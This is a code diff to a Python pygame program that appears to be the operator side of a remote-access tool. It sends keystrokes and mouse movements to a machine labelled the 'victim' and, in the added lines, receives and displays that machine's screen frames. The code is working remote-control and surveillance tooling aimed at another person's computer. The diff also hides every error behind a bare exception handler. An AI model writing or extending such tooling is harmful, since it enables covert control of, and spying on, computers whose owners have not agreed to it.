@@ -5,6 +5,9 @@ import keyboard
 import pygame
 from pygame.locals import *
 from tkinter import messagebox
+from io import BytesIO
+from PIL import Image
+import numpy as np
 
 are_down = []
 
@@ -90,46 +93,74 @@ class PygameScreen:
         self.is_pygame_screen_in_focus = False
         self.screen = pygame.display.set_mode((400, 400), RESIZABLE)
         while 1:
-            last_sent_mouse_id = 0
-            for event in pygame.event.get():
-                match event.type:
-                    case pygame.QUIT:
-                        SocketData.ip_of_victim = ()
-                        pygame.quit()
-                        if self.is_pygame_screen_in_focus:
-                            unhook_keys()
-                        return
-                    case pygame.ACTIVEEVENT:
-                        if bool(int(event.gain)):
-                            if not self.is_pygame_screen_in_focus:
-                                hook_keys()
-                                self.is_pygame_screen_in_focus = True
-                        elif self.is_pygame_screen_in_focus:
-                            unhook_keys()
-                            self.is_pygame_screen_in_focus = False
-                    case pygame.KEYDOWN:
-                        if str(event.key) not in are_down:
-                            are_down.append(str(event.key))
-                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
-                    case pygame.KEYUP:
-                        if str(event.key) in are_down:
-                            are_down.remove(str(event.key))
-                            print(event.key)
-                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
-                    case pygame.MOUSEBUTTONDOWN:
-                        pack_and_send(generate_number_to_represent_mouse_event(event))
-                    case pygame.MOUSEBUTTONUP:
-                        generated_number = generate_number_to_represent_mouse_event(event)
-                        if generated_number not in [0, 1, 17]:  # defined and not scroll
-                            pack_and_send(to_pack=generated_number + 16)  # turn the 5th byte on
-                    case pygame.MOUSEMOTION:
-                        # 7 bits y 7 bits x 1 bit motion flag 1 bit mouse flag
-                        current_mouse_id = 100 * pygame.mouse.get_pos()[1] // self.screen.get_size()[1] * 2 ** 9 \
-                                           + 100 * pygame.mouse.get_pos()[0] // self.screen.get_size()[0] * 2 ** 2 + 3
-                        if current_mouse_id != last_sent_mouse_id:
-                            pack_and_send(current_mouse_id)
-                            last_sent_mouse_id = current_mouse_id
-                            time.sleep(0.05)
+            try:
+                last_sent_mouse_id = 0
+                for event in pygame.event.get():
+                    match event.type:
+                        case pygame.QUIT:
+                            SocketData.ip_of_victim = ()
+                            pygame.quit()
+                            if self.is_pygame_screen_in_focus:
+                                unhook_keys()
+                            return
+                        case pygame.ACTIVEEVENT:
+                            if bool(int(event.gain)):
+                                if not self.is_pygame_screen_in_focus:
+                                    hook_keys()
+                                    self.is_pygame_screen_in_focus = True
+                            elif self.is_pygame_screen_in_focus:
+                                unhook_keys()
+                                self.is_pygame_screen_in_focus = False
+                        case pygame.KEYDOWN:
+                            if str(event.key) not in are_down:
+                                are_down.append(str(event.key))
+                                pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
+                        case pygame.KEYUP:
+                            if str(event.key) in are_down:
+                                are_down.remove(str(event.key))
+                                print(event.key)
+                                pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
+                        case pygame.MOUSEBUTTONDOWN:
+                            pack_and_send(generate_number_to_represent_mouse_event(event))
+                        case pygame.MOUSEBUTTONUP:
+                            generated_number = generate_number_to_represent_mouse_event(event)
+                            if generated_number not in [0, 1, 17]:  # defined and not scroll
+                                pack_and_send(to_pack=generated_number + 16)  # turn the 5th byte on
+                        case pygame.MOUSEMOTION:
+                            # 7 bits y 7 bits x 1 bit motion flag 1 bit mouse flag
+                            current_mouse_id = 100 * pygame.mouse.get_pos()[1] // self.screen.get_size()[1] * 2 ** 9 \
+                                               + 100 * pygame.mouse.get_pos()[0] // self.screen.get_size()[
+                                                   0] * 2 ** 2 + 3
+                            if current_mouse_id != last_sent_mouse_id:
+                                pack_and_send(current_mouse_id)
+                                last_sent_mouse_id = current_mouse_id
+                                time.sleep(0.05)
+                    b, ip = SocketData.s.recvfrom(2 ** 16)
+                    if len(b) == 65000:
+                        c = SocketData.s.recvfrom(2 ** 16)[0]
+                        t = time.time()
+                        b += c
+                        with BytesIO(b) as stream:
+                            img = Image.open(stream)
+                            img = img.transpose(method=Image.FLIP_TOP_BOTTOM)
+                            r, g, b = img.split()
+                            img = Image.merge("RGB", (b, g, r))
+                            print(1 / (time.time() - t))
+                            img_array = np.array(img)
+
+                            # Convert the NumPy array to Pygame surface
+                            surface = pygame.surfarray.make_surface(img_array)
+                            surface = pygame.transform.rotate(surface, 90)
+                            surface = pygame.transform.flip(surface, False, True)
+                            surface = pygame.transform.scale(surface, (pygame.display.get_window_size()))
+
+                            # Set the surface position
+                            surface_rect = surface.get_rect(center=self.screen.get_rect().center)
+
+                        self.screen.blit(surface, surface_rect)
+                        pygame.display.flip()
+            except Exception as e:
+                pass
 
 
 def pack_and_send(to_pack: int) -> None:
